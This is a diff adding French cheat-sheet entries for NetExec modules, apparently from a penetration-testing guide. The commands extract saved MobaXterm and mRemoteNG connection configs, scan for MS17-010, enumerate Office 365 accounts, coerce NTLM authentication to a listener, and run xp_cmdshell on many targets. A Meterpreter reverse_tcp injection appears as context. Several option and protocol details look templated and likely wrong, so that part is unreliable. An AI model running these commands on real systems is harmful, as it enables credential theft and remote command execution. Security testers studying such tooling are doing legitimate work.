@@ -1992,3 +1992,276 @@ nxc smb targets.txt -M met_inject -o PAYLOAD=reverse_tcp,PROCESS=svchost.exe
 
 ***
 
+#### Module : `mobaxterm`
+
+**1. Nom du Module : `mobaxterm`**
+
+* **Protocole pris en charge** : SMB
+* **Description** : Ce module recherche et extrait les informations de configuration de l'application MobaXterm sur une cible.
+
+**2. Options / Paramètres**
+
+* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M mobaxterm
+```
+
+**Explication** :
+
+* Recherche les fichiers de configuration MobaXterm sur la cible et extrait les informations pertinentes.
+
+**Commande avec fichier de sortie** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M mobaxterm -o OUTPUT=mobaxterm_config.txt
+```
+
+**Explication** :
+
+* Sauvegarde les configurations extraites dans `mobaxterm_config.txt`.
+
+**4. Commandes Avancées**
+
+Commande multi-cibles :
+
+```
+nxc smb targets.txt -M mobaxterm -o OUTPUT=all_mobaxterm_configs.txt
+```
+
+**Explication** :
+
+* Compile les configurations MobaXterm de toutes les cibles dans un fichier unique.
+
+***
+
+#### Module : `mremoteng`
+
+**1. Nom du Module : `mremoteng`**
+
+* **Protocole pris en charge** : SMB
+* **Description** : Ce module recherche et extrait les configurations enregistrées de l'application mRemoteNG sur une cible.
+
+**2. Options / Paramètres**
+
+* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M mremoteng
+```
+
+**Explication** :
+
+* Recherche les fichiers de configuration mRemoteNG sur la cible et extrait les informations pertinentes.
+
+**Commande avec fichier de sortie** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M mremoteng -o OUTPUT=mremoteng_config.txt
+```
+
+**Explication** :
+
+* Sauvegarde les configurations extraites dans `mremoteng_config.txt`.
+
+**4. Commandes Avancées**
+
+Commande multi-cibles :
+
+```
+nxc smb targets.txt -M mremoteng -o OUTPUT=all_mremoteng_configs.txt
+```
+
+**Explication** :
+
+* Compile les configurations mRemoteNG de toutes les cibles dans un fichier unique.
+
+***
+
+#### Module : `ms17-010`
+
+**1. Nom du Module : `ms17-010`**
+
+* **Protocole pris en charge** : SMB
+* **Description** : Ce module détecte la vulnérabilité EternalBlue (MS17-010) sur des cibles Windows.
+
+**2. Options / Paramètres**
+
+* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M ms17-010
+```
+
+**Explication** :
+
+* Vérifie si la cible est vulnérable à MS17-010.
+
+**Commande avec fichier de sortie** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M ms17-010 -o OUTPUT=ms17-010_results.txt
+```
+
+**Explication** :
+
+* Sauvegarde les résultats de l'analyse dans `ms17-010_results.txt`.
+
+**4. Commandes Avancées**
+
+Commande multi-cibles :
+
+```
+nxc smb targets.txt -M ms17-010 -o OUTPUT=all_ms17-010_results.txt
+```
+
+**Explication** :
+
+* Compile les résultats de l'analyse MS17-010 pour toutes les cibles dans un fichier unique.
+
+***
+
+#### Module : `msol`
+
+**1. Nom du Module : `msol`**
+
+* **Protocole pris en charge** : LDAP
+* **Description** : Ce module énumère les informations liées aux comptes Office 365 configurés dans un environnement hybride Active Directory.
+
+**2. Options / Paramètres**
+
+* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc ldap 192.168.1.10 -u admin -p 'password' -M msol
+```
+
+**Explication** :
+
+* Liste les comptes Office 365 synchronisés avec Active Directory.
+
+**Commande avec fichier de sortie** :
+
+```
+nxc ldap 192.168.1.10 -u admin -p 'password' -M msol -o OUTPUT=msol_accounts.txt
+```
+
+**Explication** :
+
+* Sauvegarde les informations sur les comptes Office 365 dans `msol_accounts.txt`.
+
+**4. Commandes Avancées**
+
+Commande multi-cibles :
+
+```
+nxc ldap targets.txt -M msol -o OUTPUT=all_msol_accounts.txt
+```
+
+**Explication** :
+
+* Compile les informations sur les comptes Office 365 pour toutes les cibles dans un fichier unique.
+
+***
+
+#### Module : `mssql_coerce`
+
+**1. Nom du Module : `mssql_coerce`**
+
+* **Protocole pris en charge** : SMB
+* **Description** : Ce module exploite les fonctionnalités SQL Server pour forcer une authentification NTLM sur un autre hôte.
+
+**2. Options / Paramètres**
+
+* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les tentatives d’authentification.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc smb 192.168.1.10 -M mssql_coerce -o LISTEN=192.168.1.20
+```
+
+**Explication** :
+
+* Force la cible à s’authentifier sur l’hôte `192.168.1.20`.
+
+**4. Commandes Avancées**
+
+Commande multi-cibles :
+
+```
+nxc smb targets.txt -M mssql_coerce -o LISTEN=192.168.1.20
+```
+
+**Explication** :
+
+* Applique la coercition NTLM sur plusieurs cibles spécifiées.
+
+***
+
+#### Module : `mssql_priv`
+
+**1. Nom du Module : `mssql_priv`**
+
+* **Protocole pris en charge** : SMB
+* **Description** : Ce module vérifie et exploite les privilèges SQL Server pour exécuter des commandes arbitraires sur la cible.
+
+**2. Options / Paramètres**
+
+* `--COMMAND` : Commande à exécuter sur SQL Server.
+* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.
+
+**3. Commandes Typiques avec Explications**
+
+**Commande de base** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M mssql_priv -o COMMAND="xp_cmdshell 'whoami'"
+```
+
+**Explication** :
+
+* Exécute la commande `whoami` via SQL Server sur la cible spécifiée.
+
+**Commande avec fichier de sortie** :
+
+```
+nxc smb 192.168.1.10 -u admin -p 'password' -M mssql_priv -o COMMAND="xp_cmdshell 'dir'",OUTPUT=cmd_results.txt
+```
+
+**Explication** :
+
+* Sauvegarde les résultats de la commande dans `cmd_results.txt`.
+
+**4. Commandes Avancées**
+
+Commande multi-cibles :
+
+```
+nxc smb targets.txt -M mssql_priv -o COMMAND="xp_cmdshell 'netstat'",OUTPUT=all_results.txt
+```
+
+**Explication** :
+
+* Exécute une commande via SQL Server sur plusieurs cibles simultanément.
+
+***
+
